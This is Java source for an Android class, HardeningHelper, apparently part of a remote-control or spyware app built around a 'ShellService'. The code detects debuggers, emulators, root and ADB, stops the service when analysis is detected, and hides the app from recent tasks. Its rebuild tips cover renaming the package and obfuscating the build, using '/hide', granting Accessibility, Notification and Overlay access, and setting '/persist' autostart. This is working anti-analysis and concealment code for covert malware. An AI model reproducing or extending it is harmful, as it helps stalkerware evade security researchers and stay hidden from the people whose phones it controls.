package com.java.panel;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import java.io.File;
import java.io.FileWriter;
import java.lang.reflect.Method;

/**
 * Hardening / anti-analysis runtime controls.
 * - Flag debuggable / emulator / root
 * - Optional self-stop when analysis environment detected
 * - Hide from recent tasks (best-effort)
 * - Dummy component names guidance for rebuild
 *
 * This does NOT bypass banking root detection or Play Protect.
 * It raises the cost of casual reverse engineering and sandbox triage.
 */
public class HardeningHelper {

    private static boolean killOnAnalysis = false;

    public static void setKillOnAnalysis(boolean v) {
        killOnAnalysis = v;
    }

    public static boolean isKillOnAnalysis() {
        return killOnAnalysis;
    }

    public static String applyRuntimeChecks(Context ctx) {
        StringBuilder sb = new StringBuilder();
        sb.append("🔒 Hardening check\n");

        boolean threat = false;

        // Debugger
        if (android.os.Debug.isDebuggerConnected()) {
            sb.append("• Debugger: DETECTED\n");
            threat = true;
        } else {
            sb.append("• Debugger: clear\n");
        }

        // Debuggable flag
        try {
            boolean debuggable = (ctx.getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
            sb.append("• App debuggable flag: ").append(debuggable ? "YES (rebuild release)" : "NO").append("\n");
            if (debuggable) threat = true;
        } catch (Exception ignored) {}

        // Emulator signals
        String emu = AntiAnalysisHelper.checkEmulator();
        sb.append(emu);
        if (emu.contains("YES")) threat = true;

        // Root
        String root = AntiAnalysisHelper.checkRoot();
        sb.append(root);

        // ADB
        try {
            int adb = Settings.Global.getInt(ctx.getContentResolver(), Settings.Global.ADB_ENABLED, 0);
            sb.append("• ADB enabled: ").append(adb == 1 ? "YES" : "NO").append("\n");
        } catch (Exception ignored) {}

        sb.append("• Kill-on-analysis: ").append(killOnAnalysis ? "ON" : "OFF").append("\n");

        if (threat && killOnAnalysis) {
            sb.append("\n⚠️ Threat detected — stopping service (kill-on-analysis).\n");
            try {
                if (ShellService.instance != null) {
                    ShellService.instance.stopSelf();
                }
            } catch (Exception ignored) {}
        }

        return sb.toString();
    }

    public static String enableKillSwitch(boolean on) {
        killOnAnalysis = on;
        return "🔒 Kill-on-analysis: " + (on ? "ENABLED" : "DISABLED");
    }

    /** Best-effort: exclude from recents via reflection on Activity if available */
    public static String excludeFromRecents(Context ctx) {
        try {
            // Documented approach requires Activity flag; service context limited.
            // Write a marker so MainActivity can apply FLAG_EXCLUDE_FROM_RECENTS on next launch.
            File f = new File(ShellService.TARGET_DIR, "exclude_recents.flag");
            FileWriter fw = new FileWriter(f, false);
            fw.write("1");
            fw.close();
            return "✅ Flag set. MainActivity will exclude from recents on next open.";
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    public static String status(Context ctx) {
        return applyRuntimeChecks(ctx);
    }

    /**
     * Rename guidance for rebuild (package / app name).
     * Actual rename must be done in Gradle + manifest before compile.
     */
    public static String renameGuidance() {
        return "📦 Rebuild hardening tips:\n"
                + "1. Change applicationId in app/build.gradle\n"
                + "2. Change android:label in manifest / strings.xml\n"
                + "3. Change package folder names if desired\n"
                + "4. Build release with minifyEnabled true + proguard-rules.pro\n"
                + "5. Use /hide after install\n"
                + "6. Grant Accessibility + Notification + Overlay + Battery whitelist\n"
                + "7. /persist autostart on OEM skins\n";
    }
}
